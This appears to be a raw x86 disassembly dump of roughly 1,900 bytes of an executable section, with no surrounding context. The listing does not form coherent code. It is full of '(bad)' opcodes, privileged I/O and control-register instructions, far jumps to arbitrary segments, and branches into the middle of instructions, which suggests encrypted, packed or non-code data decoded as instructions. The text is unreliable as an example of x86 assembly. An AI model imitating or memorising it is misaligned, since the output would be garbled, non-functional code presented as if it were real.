  4170bb:	xlat   BYTE PTR ds:[ebx]
  4170bc:	push   0x41
  4170be:	mov    WORD PTR [edx],?
  4170c0:	(bad)  
  4170c1:	outs   dx,BYTE PTR ds:[esi]
  4170c2:	xor    cl,BYTE PTR [esi+0x5c]
  4170c5:	jbe    0x4170be
  4170c7:	mov    ebp,0x9075df6f
  4170cc:	xor    ecx,DWORD PTR [esi-0x3d]
  4170cf:	js     0x4170d2
  4170d1:	fld    QWORD PTR [ebx+edx*4+0x43e9c4a1]
  4170d8:	fisttp WORD PTR [esi]
  4170da:	sbb    ebp,DWORD PTR [ebp-0x6a0ab510]
  4170e0:	jecxz  0x417149
  4170e2:	in     eax,0xef
  4170e4:	sub    ch,bh
  4170e6:	inc    BYTE PTR [ebp-0x3]
  4170e9:	sbb    ecx,DWORD PTR ds:0xed443ada
  4170ef:	and    dl,ah
  4170f1:	fbstp  TBYTE PTR [eax]
  4170f3:	dec    eax
  4170f4:	cdq    
  4170f5:	cmp    DWORD PTR [edi+eax*8],eax
  4170f8:	loopne 0x4170c7
  4170fa:	aad    0x32
  4170fc:	xor    bh,BYTE PTR [edx+0x72]
  4170ff:	retf   0xc8b
  417102:	out    0xec,eax
  417104:	or     ecx,DWORD PTR [ebx]
  417106:	les    edi,FWORD PTR [esi+ebp*8-0x18904f25]
  41710d:	shr    BYTE PTR [esi],1
  41710f:	sbb    al,0x16
  417111:	ret    0xdcc0
  417114:	in     al,dx
  417115:	idiv   DWORD PTR [ecx+esi*1-0xa4bc25a]
  41711c:	outs   dx,BYTE PTR ds:[esi]
  41711d:	and    BYTE PTR [eax+0xa],al
  417120:	add    BYTE PTR [ecx-0xddc07e1],dh
  417126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417127:	inc    esp
  417128:	inc    ebx
  417129:	cmp    BYTE PTR [ebx],bh
  41712b:	mov    ebp,0x40550a49
  417130:	out    0x66,eax
  417132:	stos   BYTE PTR es:[edi],al
  417133:	pop    esp
  417134:	daa    
  417135:	sbb    DWORD PTR [edx-0x28],ecx
  417138:	xchg   ebx,eax
  417139:	mov    dl,0xb6
  41713b:	(bad)  
  41713d:	pop    ds
  41713e:	push   esp
  41713f:	xchg   edx,ebp
  417141:	gs xor ecx,0x38fe7a6f
  417148:	pop    esi
  417149:	or     bh,0x57
  41714c:	and    ah,BYTE PTR [edi+0x60]
  41714f:	push   ebp
  417150:	sub    al,0xca
  417152:	jo     0x41710d
  417154:	aas    
  417155:	xlat   BYTE PTR ds:[ebx]
  417156:	(bad)  
  417157:	pop    ss
  417158:	nop
  417159:	outs   dx,BYTE PTR ds:[esi]
  41715a:	int    0x24
  41715c:	xor    dh,BYTE PTR [eax+edi*4+0x7a]
  417160:	cs sub al,0x64
  417163:	xchg   ecx,eax
  417164:	rol    ecx,1
  417166:	dec    ebp
  417167:	adc    BYTE PTR [edx-0x691b7e9d],cl
  41716d:	mov    esi,0xf89d2f16
  417172:	lock sub dl,BYTE PTR [ebx-0x76]
  417176:	push   es
  417177:	push   ecx
  417178:	jmp    DWORD PTR [ebx-0x7da2552d]
  41717e:	mov    ah,0xb5
  417180:	and    esi,DWORD PTR [edx-0xf235631]
  417186:	jne    0x4171d6
  417188:	adc    eax,0x3bbad4f
  41718d:	ins    DWORD PTR es:[edi],dx
  41718e:	aaa    
  41718f:	fiadd  WORD PTR [edx+0x7cce5b7b]
  417195:	daa    
  417196:	jmp    0xf037e006
  41719b:	test   al,0xab
  41719d:	xor    al,0x3a
  41719f:	jne    0x4171f9
  4171a1:	pop    es
  4171a2:	mov    fs,ebp
  4171a4:	xor    cl,BYTE PTR [edx-0x4]
  4171a7:	jne    0x417200
  4171a9:	jne    0x41714d
  4171ab:	cmp    BYTE PTR [esi-0x5c3c62b],al
  4171b1:	repz add DWORD PTR [edx+0x6a77cf21],edi
  4171b8:	push   es
  4171b9:	add    dh,bl
  4171bb:	add    al,BYTE PTR [edi+0x260c5b15]
  4171c1:	mov    ebx,0x9040e290
  4171c6:	mov    ebx,DWORD PTR [eax-0x3f]
  4171c9:	sbb    ebp,DWORD PTR [edi]
  4171cb:	push   ss
  4171cc:	xchg   edi,eax
  4171cd:	push   esi
  4171ce:	pop    esi
  4171cf:	lds    ecx,FWORD PTR [edx]
  4171d1:	sbb    eax,0x174882a5
  4171d6:	scas   eax,DWORD PTR es:[edi]
  4171d7:	das    
  4171d8:	sbb    eax,0x49468976
  4171dd:	jecxz  0x41725d
  4171df:	push   ebx
  4171e0:	ins    DWORD PTR es:[edi],dx
  4171e1:	(bad)  
  4171e2:	or     eax,0x36a8db3b
  4171e7:	lock pop ds
  4171e9:	icebp  
  4171ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171eb:	fldz   
  4171ed:	jb     0x41719f
  4171ef:	dec    esi
  4171f0:	test   eax,0xba26d8e1
  4171f5:	dec    BYTE PTR [edx+0x2434f3c7]
  4171fb:	push   ebp
  4171fc:	mov    esp,0x68a518eb
  417201:	add    al,0xe9
  417203:	or     eax,0x57c8f155
  417208:	pop    eax
  417209:	(bad)  
  41720a:	outs   dx,DWORD PTR ds:[esi]
  41720b:	lea    esi,[eax]
  41720d:	inc    edx
  41720e:	sbb    edi,DWORD PTR [ebp-0x1cc3622c]
  417214:	dec    ebx
  417215:	bound  esi,QWORD PTR [edx-0x16da8045]
  41721b:	shr    BYTE PTR [ecx],0x33
  41721e:	mov    ds:0x998065b8,eax
  417223:	sbb    al,0x68
  417225:	xor    ebp,DWORD PTR [edi+0x598fcf9b]
  41722b:	iret   
  41722c:	cmp    dl,BYTE PTR [ebx+0x72]
  41722f:	push   0x24
  417231:	repnz pop ebx
  417233:	ror    BYTE PTR [ebx+edi*4],cl
  417236:	inc    eax
  417237:	sahf   
  417238:	inc    esp
  417239:	mov    bl,0xfe
  41723b:	jno    0x4171d3
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	and    edx,ebx
  417256:	daa    
  417257:	sub    BYTE PTR [eax+0x26],dh
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x8270707e
  417261:	jge    0x4171f4
  417263:	lods   al,BYTE PTR ds:[esi]
  417264:	shl    DWORD PTR [edx+edi*4+0x5793ec09],cl
  41726b:	retf   0x9576
  41726e:	add    BYTE PTR [ebp+0x49],cl
  417271:	outs   dx,BYTE PTR ds:[esi]
  417272:	or     dl,BYTE PTR [ecx+0x1]
  417275:	clc    
  417276:	and    ch,BYTE PTR [eax+edi*8+0x5e87c40a]
  41727d:	dec    ecx
  41727e:	xchg   ebx,eax
  41727f:	cmp    DWORD PTR [ecx+0x19],ebx
  417282:	not    BYTE PTR [esi]
  417284:	mov    esp,0x7b8e79d3
  417289:	imul   esi,DWORD PTR [ecx+0x1cf273b6],0x18fdce90
  417293:	imul   eax,ebx,0x249aa3b6
  417299:	sbb    eax,0x8280ddb3
  41729e:	mov    dl,0xa0
  4172a0:	in     al,0x1e
  4172a2:	dec    edi
  4172a3:	call   0x5afa:0x2450aee1
  4172aa:	xor    al,0xb9
  4172ac:	push   ecx
  4172ad:	lods   eax,DWORD PTR ds:[esi]
  4172ae:	fbld   TBYTE PTR [ebx+0x66]
  4172b1:	xlat   BYTE PTR ds:[ebx]
  4172b2:	dec    ebx
  4172b3:	pop    esp
  4172b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172b5:	lds    edi,FWORD PTR [ecx+0x42]
  4172b8:	call   DWORD PTR [eax+0x3509201b]
  4172be:	pop    ds
  4172bf:	into   
  4172c0:	mov    ds:0x7be9abd3,eax
  4172c5:	cmp    eax,0xa5a5c8c9
  4172ca:	loop   0x4172ac
  4172cc:	jg     0x4172b6
  4172ce:	adc    esp,ebp
  4172d0:	add    ah,BYTE PTR [eax+0x22]
  4172d3:	out    0xc6,al
  4172d5:	rol    BYTE PTR [ebx-0x536559aa],cl
  4172db:	jns    0x417275
  4172dd:	mov    dl,0xd1
  4172df:	inc    edi
  4172e0:	jb     0x41728c
  4172e2:	cwde   
  4172e3:	mov    ch,0x3f
  4172e5:	call   0xd546:0xd39c6eca
  4172ec:	push   ds
  4172ed:	mov    ebx,0x1cdc53a3
  4172f2:	jnp    0x417358
  4172f4:	iret   
  4172f5:	mov    cr6,ecx
  4172f8:	das    
  4172f9:	data16 cmc 
  4172fb:	add    al,bh
  4172fd:	push   edi
  4172ff:	fnstcw WORD PTR [edx-0x36]
  417302:	das    
  417303:	and    al,0x27
  417305:	iret   
  417306:	mov    eax,ds:0xf015fd67
  41730b:	xchg   ecx,eax
  41730c:	sbb    ch,BYTE PTR [ecx+0x3b7670ac]
  417312:	jp     0x417296
  417314:	or     ch,bh
  417316:	call   DWORD PTR [ebx-0x170c13df]
  41731c:	lds    eax,FWORD PTR [edx-0x21]
  41731f:	clc    
  417320:	xchg   edi,eax
  417321:	cld    
  417322:	xchg   ebx,eax
  417323:	fld    QWORD PTR [edi+0x25c2200d]
  417329:	add    eax,DWORD PTR [edx+edi*2]
  41732c:	and    BYTE PTR [ebp+0x20c45ccd],bl
  417332:	divps  xmm6,XMMWORD PTR [eax+0x298ce39f]
  417339:	xor    eax,0x5a356d6d
  41733e:	imul   edx,DWORD PTR [edi-0x50e9c109],0x13
  417345:	icebp  
  417346:	sbb    edi,DWORD PTR [ecx-0x33ec1a36]
  41734c:	or     bl,BYTE PTR [edi]
  41734e:	dec    eax
  41734f:	or     edx,edi
  417351:	xchg   esi,eax
  417352:	cli    
  417353:	out    0xbc,eax
  417355:	push   0xffffffcb
  417357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417358:	sub    eax,0x41e5710
  41735d:	jbe    0x4173a2
  41735f:	cmp    al,0x34
  417361:	rcl    DWORD PTR [eax-0x3c5afd35],0x56
  417368:	(bad)  
  417369:	push   0xffffffc9
  41736b:	mov    dl,0xa8
  41736d:	mov    eax,ds:0x5adff23b
  417372:	jmp    0x4172fa
  417374:	adc    DWORD PTR [ebx],ebp
  417376:	(bad)  
  417377:	fmul   DWORD PTR [esi]
  417379:	bound  ebp,QWORD PTR [edx-0x52]
  41737c:	xchg   edi,eax
  41737d:	(bad)  
  41737e:	ss push edi
  417380:	pop    es
  417381:	and    eax,0x6baffeb5
  417386:	nop
  417387:	leave  
  417388:	je     0x417372
  41738a:	sbb    BYTE PTR [edi],0x47
  41738d:	ror    BYTE PTR ds:0x63618763,cl
  417393:	dec    eax
  417394:	push   ds
  417395:	ja     0x417342
  417397:	inc    eax
  417398:	add    eax,0xe743d08d
  41739d:	repz cmc 
  41739f:	gs retf 0xdf9c
  4173a3:	stos   BYTE PTR es:[edi],al
  4173a4:	cmp    DWORD PTR ds:[edi],edi
  4173a7:	pusha  
  4173a8:	push   ebx
  4173a9:	imul   edi,DWORD PTR [ecx+0x21],0xb78f8a68
  4173b0:	ror    cl,0x92
  4173b3:	in     al,dx
  4173b4:	adc    eax,0xede1eb5a
  4173b9:	push   ss
  4173ba:	(bad)  
  4173bc:	nop
  4173bd:	aas    
  4173be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173bf:	cmp    ebp,DWORD PTR [edi+0x53649232]
  4173c5:	jo     0x4173fc
  4173c7:	ret    
  4173c8:	mov    esp,edx
  4173ca:	pop    esi
  4173cb:	xchg   dh,cl
  4173cd:	pop    edx
  4173ce:	jg     0x4173fa
  4173d0:	pop    ebp
  4173d1:	xor    eax,0xd7810d5a
  4173d6:	dec    esi
  4173d7:	push   ss
  4173d8:	shl    edx,0x27
  4173db:	fwait
  4173dc:	out    0xa2,al
  4173de:	fwait
  4173df:	add    BYTE PTR [ebx+0x64b59b4f],bl
  4173e5:	xor    eax,0x45be7de5
  4173ea:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4173ec:	retf   
  4173ed:	shr    BYTE PTR [eax-0xb],cl
  4173f0:	scas   al,BYTE PTR es:[edi]
  4173f1:	xchg   esi,eax
  4173f2:	dec    edi
  4173f3:	retf   
  4173f4:	xor    dl,al
  4173f6:	add    BYTE PTR [ebx-0x7cc5c4dd],bh
  4173fc:	mov    bl,0x63
  4173fe:	pushf  
  4173ff:	dec    esi
  417400:	push   ds
  417401:	or     BYTE PTR [ebx+0x39cd7a45],bl
  417407:	repz mov ebx,0xf9374c7d
  41740d:	push   ds
  41740e:	mov    WORD PTR [ecx-0x2a],?
  417411:	(bad)  
  417412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417413:	ret    
  417414:	dec    esi
  417415:	imul   edx,DWORD PTR [ecx+ebp*2-0xd],0xffffffd4
  41741a:	and    esp,DWORD PTR [edx]
  41741c:	xor    bh,bl
  41741e:	push   esi
  41741f:	push   ebp
  417420:	xchg   edx,eax
  417421:	pop    ds
  417422:	sbb    BYTE PTR [edi],al
  417424:	rcr    DWORD PTR [ebx-0x39],0x57
  417428:	stc    
  417429:	cwde   
  41742a:	cmp    DWORD PTR [eax+0x521c4630],esp
  417430:	mov    al,ds:0xf76b0ae5
  417435:	icebp  
  417436:	sti    
  417437:	jg     0x4174a7
  417439:	shl    BYTE PTR [edx-0x5dda46e3],cl
  41743f:	sbb    bh,BYTE PTR [edi+0xdcb18b7]
  417445:	ss rol ah,0x1d
  417449:	sub    cl,BYTE PTR [ecx]
  41744b:	fwait
  41744c:	push   0x66
  41744e:	or     bl,bh
  417450:	pop    edx
  417451:	test   eax,0x929be509
  417456:	sub    BYTE PTR [eax],bh
  417458:	push   0xffffffbd
  41745a:	jl     0x41745e
  41745c:	ret    
  41745d:	mov    DWORD PTR [ecx-0x4b2cdfd6],ebx
  417463:	addr16 mov dh,0x34
  417466:	jg     0x4174a9
  417468:	jnp    0x41744c
  41746a:	fnstsw WORD PTR [ecx]
  41746c:	gs sub bl,dh
  41746f:	xor    DWORD PTR [eax],edx
  417471:	into   
  417472:	dec    ecx
  417473:	or     BYTE PTR [ecx],dl
  417475:	sbb    eax,0x4641021c
  41747a:	popa   
  41747b:	and    al,0x44
  41747d:	add    esp,DWORD PTR [edi+0x50bb62e5]
  417483:	and    al,0x96
  417485:	call   0xe2ad:0x31b87c4a
  41748c:	cs pop ebx
  41748e:	fistp  QWORD PTR [eax+0x7ecb1ac0]
  417494:	push   eax
  417495:	or     DWORD PTR [esi-0x2906af8],ebp
  41749b:	cmp    BYTE PTR [edx],0xd9
  41749e:	(bad)  
  41749f:	cmp    BYTE PTR [ebx],al
  4174a1:	sbb    eax,DWORD PTR [eax]
  4174a3:	call   0xee5149a9
  4174a8:	lea    edx,[ebp-0x3a5c0c54]
  4174ae:	mov    ch,0x94
  4174b0:	pop    ss
  4174b1:	mov    al,0x7a
  4174b3:	adc    eax,0x56414c63
  4174b8:	xor    BYTE PTR [ebx-0x2e],al
  4174bb:	popf   
  4174bc:	(bad)  
  4174bd:	lahf   
  4174be:	pop    esp
  4174bf:	sbb    al,0xe7
  4174c1:	xor    DWORD PTR [ecx+0x1d],esi
  4174c4:	jb     0x417464
  4174c6:	(bad)  
  4174c7:	jmp    0x64a64dd4
  4174cc:	or     al,0x20
  4174ce:	push   eax
  4174cf:	or     DWORD PTR [eax-0x47],esp
  4174d2:	xchg   DWORD PTR [edx-0x4d77a3c8],edi
  4174d8:	fild   WORD PTR [eax-0xe]
  4174db:	dec    edx
  4174dc:	adc    BYTE PTR [ebx],cl
  4174de:	lahf   
  4174df:	int3   
  4174e0:	int    0x6d
  4174e2:	cmp    esi,ebp
  4174e4:	push   0xffffffaf
  4174e6:	pop    ecx
  4174e7:	lods   eax,DWORD PTR ds:[esi]
  4174e8:	dec    DWORD PTR [edi-0x3e]
  4174eb:	dec    esp
  4174ec:	sub    edi,edi
  4174ee:	ss jbe 0x417540
  4174f1:	and    BYTE PTR [eax],ah
  4174f3:	inc    edx
  4174f4:	jmp    FWORD PTR [eax-0x2d]
  4174f7:	push   edx
  4174f8:	inc    esi
  4174f9:	pop    ecx
  4174fa:	push   esp
  4174fb:	push   0xffffffcd
  4174fd:	inc    eax
  4174fe:	dec    edi
  4174ff:	lea    edx,[edi-0x7f]
  417502:	mov    DWORD PTR es:[ebx+0x6f],esi
  417506:	test   al,0xe9
  417508:	mov    esp,0xd91e7073
  41750d:	fdiv   DWORD PTR [ecx-0x57]
  417510:	stos   BYTE PTR es:[edi],al
  417511:	jmp    0xa721:0x92d1096f
  417518:	mov    ebx,DWORD PTR [esi+0x4a4934f9]
  41751e:	fmul   DWORD PTR [ecx+0x10]
  417521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417522:	and    dl,al
  417524:	inc    esp
  417525:	and    DWORD PTR [ecx+0x5d01d233],ecx
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    eax,eax
  417543:	push   ss
  417544:	fdivr  DWORD PTR [eax]
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x417591
  41754f:	jmp    0x4175a4
  417551:	not    DWORD PTR [eax+0x68]
  417554:	loop   0x4174e3
  417556:	(bad)
  41755a:	bsf    eax,DWORD PTR [edi+eiz*4-0x1d5b6097]
  417562:	(bad)  
  417563:	jge    0x41750c
  417565:	pop    eax
  417566:	mov    BYTE PTR [edx+0x19fabbb9],al
  41756c:	push   ds
  41756d:	jp     0x417528
  41756f:	jo     0x417556
  417571:	ins    DWORD PTR es:[edi],dx
  417572:	div    BYTE PTR [edi]
  417574:	xchg   edi,eax
  417575:	cld    
  417576:	jns    0x417524
  417578:	push   0x56
  41757a:	and    ah,dh
  41757c:	push   0x865cb77a
  417581:	out    0x6d,eax
  417583:	mov    esp,0x23bb65d1
  417588:	push   ebp
  417589:	xchg   ebx,eax
  41758a:	xor    BYTE PTR ds:0x99b2a165,0xb4
  417591:	jle    0x417602
  417593:	retf   
  417594:	xor    DWORD PTR [ebp+0x40],eax
  417597:	inc    edi
  417598:	xchg   esi,eax
  417599:	int3   
  41759a:	(bad)  
  41759b:	push   ebp
  41759c:	sub    cl,BYTE PTR [esi]
  41759e:	hlt    
  41759f:	sub    bh,ch
  4175a1:	cld    
  4175a2:	and    esp,esi
  4175a4:	mov    edx,0x99030e16
  4175a9:	cmp    DWORD PTR [eax-0x4f],edx
  4175ac:	mov    ecx,0xfc31dca8
  4175b1:	mov    esi,0xccd6d6ff
  4175b6:	lds    edi,FWORD PTR [edi+0x51bf4e20]
  4175bc:	cdq    
  4175bd:	cmp    cl,cl
  4175bf:	adc    DWORD PTR [ebx+0x1f],ebp
  4175c2:	jmp    0x417643
  4175c4:	push   esp
  4175c5:	push   ss
  4175c6:	test   DWORD PTR [edi+0x5a],ebx
  4175c9:	loope  0x4175c0
  4175cb:	or     BYTE PTR [ebx+0xd],cl
  4175ce:	mov    al,0x28
  4175d0:	sbb    BYTE PTR [ecx],dh
  4175d2:	in     eax,0x48
  4175d4:	pop    esi
  4175d5:	jns    0x417617
  4175d7:	pop    edx
  4175d8:	add    al,BYTE PTR [ebx+0x28]
  4175db:	addr16 ret 
  4175dd:	ret    
  4175de:	cmp    bh,dl
  4175e0:	mov    dh,0x95
  4175e2:	inc    edi
  4175e3:	ins    BYTE PTR es:[edi],dx
  4175e4:	loope  0x4175c3
  4175e6:	sahf   
  4175e7:	int3   
  4175e8:	in     al,dx
  4175e9:	push   esi
  4175ea:	dec    ebx
  4175eb:	test   edx,eax
  4175ed:	fnstcw WORD PTR [esi-0x71]
  4175f0:	in     ax,0xec
  4175f3:	ja     0x4175b2
  4175f5:	out    0xbf,eax
  4175f7:	cmp    al,0x87
  4175f9:	imul   ecx,DWORD PTR ds:0x23e3cf41,0xe4d7ba3e
  417603:	(bad)  
  417604:	(bad)  
  417605:	rcr    BYTE PTR [esi+0x5e],0xbb
  417609:	push   esi
  41760a:	ror    BYTE PTR [ebx],1
  41760c:	jae    0x4175a5
  41760e:	jb     0x41766a
  417610:	add    al,al
  417612:	cmp    DWORD PTR [ebp+0x15],ecx
  417615:	xlat   BYTE PTR ds:[ebx]
  417616:	ret    0x59d8
  417619:	clc    
  41761a:	cwde   
  41761b:	cmp    eax,0xe3829749
  417620:	jmp    0x9ff2:0xc4f31053
  417627:	js     0x417636
  417629:	sub    ah,cl
  41762b:	or     BYTE PTR [edx],0x75
  41762e:	dec    esi
  41762f:	aaa    
  417630:	push   ebx
  417631:	scas   al,BYTE PTR es:[edi]
  417632:	jno    0x4175d6
  417634:	push   esi
  417635:	cwde   
  417636:	push   ss
  417637:	cmp    al,0x2
  417639:	xor    DWORD PTR [edx+0x49059264],edi
  41763f:	and    DWORD PTR [ecx+0x2b],esp
  417642:	jno    0x4175de
  417644:	adc    DWORD PTR [esi],edx
  417646:	dec    edi
  417647:	(bad)  
  417648:	xlat   BYTE PTR ds:[ebx]
  417649:	xchg   esp,eax
  41764a:	popf   
  41764b:	sub    esi,DWORD PTR [ebx-0x58]
  41764e:	push   0x6e
  417650:	mov    ebp,0x1b957358
  417655:	mov    ch,dh
  417657:	pop    edi
  417658:	jmp    0xa539:0x4daf8ee4
  41765f:	or     dh,BYTE PTR [edi-0x75da2168]
  417665:	cmp    BYTE PTR [ebx+0x40afcbcc],0xb3
  41766c:	inc    ecx
  41766d:	stc    
  41766e:	xchg   ecx,eax
  41766f:	jb     0x4176a0
  417671:	mov    ebp,0xc52d458c
  417676:	sub    DWORD PTR [ecx-0x44],ebx
  417679:	or     eax,0xda80dc02
  41767e:	cwde   
  41767f:	scas   ax,WORD PTR es:[edi]
  417681:	paddw  mm3,QWORD PTR [ebx+0x4c86d2fe]
  417688:	pop    ss
  417689:	ss sub al,0xc1
  41768c:	aas    
  41768d:	pusha  
  41768e:	jmp    0x8c8a4158
  417693:	in     eax,0x30
  417695:	jp     0x4176de
  417697:	or     eax,0x9d704895
  41769c:	retf   
  41769d:	xlat   BYTE PTR ds:[ebx]
  41769e:	push   es
  41769f:	sub    esp,ebx
  4176a1:	push   es
  4176a2:	adc    eax,0x277765ef
  4176a7:	jb     0x4176df
  4176a9:	les    ebp,FWORD PTR [esi-0x2901dca]
  4176af:	dec    BYTE PTR [esi+0x444aff3d]
  4176b5:	fwait
  4176b6:	cmp    edx,ebp
  4176b8:	mov    ecx,0x23a0755e
  4176bd:	scas   eax,DWORD PTR es:[edi]
  4176be:	add    BYTE PTR [esp+eiz*4],dl
  4176c1:	pop    ebx
  4176c2:	xor    al,bl
  4176c4:	test   eax,ebx
  4176c6:	mov    dl,0x25
  4176c8:	popa   
  4176c9:	push   cs
  4176ca:	std    
  4176cb:	inc    ebp
  4176cc:	mov    ds:0x10bd0199,al
  4176d1:	xchg   esp,eax
  4176d2:	lea    edx,[edi-0x3a]
  4176d5:	aaa    
  4176d6:	xchg   DWORD PTR [edx+0x43],edi
  4176d9:	jns    0x4176af
  4176db:	rcr    DWORD PTR [ebp-0x4a74cd15],0x3a
  4176e2:	iret   
  4176e3:	(bad)  
  4176e5:	icebp  
  4176e6:	xor    ebx,DWORD PTR [esi+0x2b0db1c2]
  4176ec:	xchg   ecx,eax
  4176ed:	jne    0x41774f
  4176ef:	fisttp QWORD PTR [edi+ecx*2-0xe]
  4176f3:	test   eax,0xc9ef2621
  4176f8:	jle    0x4176cf
  4176fa:	sbb    al,0xd
  4176fc:	adc    DWORD PTR [ebx],edx
  4176fe:	dec    edx
  4176ff:	sbb    BYTE PTR [ebp-0x2],bl
  417702:	es pop ebp
  417704:	out    dx,al
  417705:	or     eax,0xd1b983bd
  41770a:	in     eax,0xa4
  41770c:	xor    ebx,ebx
  41770e:	adc    ecx,eax
  417710:	out    dx,al
  417711:	retf   0x79e3
  417714:	sbb    DWORD PTR [esi+edi*2-0x3b],ebx
  417718:	sbb    BYTE PTR [eax+0x6d3edb81],ch
  41771e:	mov    ds,WORD PTR ds:0x10cc0042
  417724:	dec    edx
  417725:	mov    eax,0x47d69437
  41772a:	pop    ss
  41772b:	push   0xdee99c93
  417730:	rcr    BYTE PTR [edx],1
  417732:	mov    ch,0xd7
  417734:	jmp    0x417773
  417736:	adc    DWORD PTR [eax],edx
  417738:	neg    BYTE PTR [ebx+0x1f15cc0b]
  41773e:	push   esi
  41773f:	ret    
  417740:	xor    al,0x24
  417742:	mov    esi,0x83b81d93
  417747:	mov    eax,0x3138e6e0
  41774c:	(bad)  
  41774e:	in     eax,dx
  41774f:	shl    DWORD PTR [ecx-0x602ea03],1
  417755:	dec    eax
  417756:	add    eax,0x89b2ea47
  41775b:	jl     0x417770
  41775d:	push   edx
  41775e:	jl     0x41772e
  417760:	(bad)  
  417762:	pop    ss
  417763:	(bad)  [ebp+0x2a]
  417766:	pop    eax
  417767:	push   ds
  417768:	or     al,0xd
  41776a:	push   es
  41776b:	adc    edi,DWORD PTR [esi+esi*2-0x7a]
  41776f:	jmp    0x6d141f0b
  417774:	pop    ebp
  417775:	jmp    0x93e41c1b
  41777a:	or     eax,ebx
  41777c:	pop    eax
  41777d:	mov    esi,0xdf34c0c2
  417782:	cli    
  417783:	pop    ecx
  417784:	or     ebp,DWORD PTR [esi+0x841f999]
  41778a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41778b:	adc    edi,DWORD PTR [edx]
  41778d:	ins    DWORD PTR es:[edi],dx
  41778e:	loop   0x4177b5
  417790:	push   edx
  417791:	arpl   dx,bp
  417793:	aam    0x16
  417795:	xchg   BYTE PTR [esi-0x1c048f81],ch
  41779b:	pusha  
  41779c:	dec    eax
  41779d:	inc    ecx
  41779e:	dec    ecx
  41779f:	scas   al,BYTE PTR es:[edi]
  4177a0:	xor    BYTE PTR [ecx-0x74],bl
  4177a3:	retf   0x8804
  4177a6:	lock xchg ecx,eax
  4177a8:	push   ebp
  4177a9:	adc    esp,eax
  4177ab:	cmc    
  4177ac:	sub    esi,DWORD PTR [ebp-0x48]
  4177af:	sbb    al,al
  4177b1:	mov    ds:0xca913135,eax
  4177b6:	lock xchg ecx,eax
  4177b8:	or     ah,BYTE PTR [ecx]
  4177ba:	push   ebx
  4177bb:	add    ecx,esp
  4177bd:	shr    DWORD PTR [edx+0x315f41b6],1
  4177c3:	mov    BYTE PTR [ecx+0x272ef0b5],bl
  4177c9:	xchg   si,ax
  4177cb:	jnp    0x4177cf
  4177cd:	ror    DWORD PTR [edi+0x6a5dfc8f],cl
  4177d3:	pop    ss
  4177d4:	cmc    
  4177d5:	ss mov cl,0x4e
  4177d8:	sub    esi,DWORD PTR [edx]
  4177da:	ins    DWORD PTR es:[edi],dx
  4177db:	xor    BYTE PTR [eax],0x1f
  4177de:	gs popa 
  4177e0:	or     BYTE PTR [eax-0xe3dc591],ch
  4177e6:	mov    al,ds:0x1221ffa6
  4177eb:	outs   dx,BYTE PTR ds:[esi]
  4177ec:	lock test DWORD PTR [edi+ebp*1+0x2986f8db],ecx
  4177f4:	fdiv   st(5),st
  4177f6:	pop    esi
  4177f7:	out    0xee,al
  4177f9:	or     DWORD PTR [eax+0x9],ebx
  4177fc:	mov    ah,0x62
  4177fe:	sbb    BYTE PTR [eax],ah
  417800:	in     eax,0x45
  417802:	retf   
  417803:	daa    
  417804:	push   ebx
  417805:	rcr    BYTE PTR [edi-0x56efb1b3],1
  41780b:	xor    esi,DWORD PTR [ecx+0x3ee721eb]
  417811:	inc    esp
  417812:	mov    ah,0x5
  417814:	xor    eax,0xc2c95b5e
  417819:	adc    BYTE PTR [eax],al
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
